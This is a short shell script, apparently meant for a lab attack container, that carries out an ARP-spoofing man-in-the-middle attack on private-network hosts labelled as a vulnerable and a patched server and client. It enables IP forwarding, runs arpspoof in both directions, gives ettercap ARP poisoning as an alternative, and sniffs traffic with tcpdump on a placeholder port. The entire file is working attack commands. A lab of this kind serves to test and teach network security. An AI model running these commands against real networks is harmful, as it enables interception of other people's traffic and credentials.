#!/bin/sh
# Run inside tp-attack after its startup packages finish installing.
set -eu

ip -4 addr show eth0
ping -c 1 -W 2 10.5.0.10
ping -c 1 -W 2 10.5.0.11
ping -c 1 -W 2 10.5.0.30

# Check the available network interface
# ip route

# Set up the MITM connection
echo 1 > /proc/sys/net/ipv4/ip_forward 

# Vulnerable server and client
arpspoof -i eth0 -t 10.5.0.10 10.5.0.30 & 
arpspoof -i eth0 -t 10.5.0.30 10.5.0.10 & 
# Patched server and client
arpspoof -i eth0 -t 10.5.0.11 10.5.0.30 & 
arpspoof -i eth0 -t 10.5.0.30 10.5.0.11 & 

# Alternative 
ettercap -T -q -M arp:remote /10.5.0.30// /10.5.0.11//

ettercap -T -q -M arp:remote /10.5.0.30// /10.5.0.11//

# To sniff an interface 
tcpdump -i eth0 -A -l port <PORT>

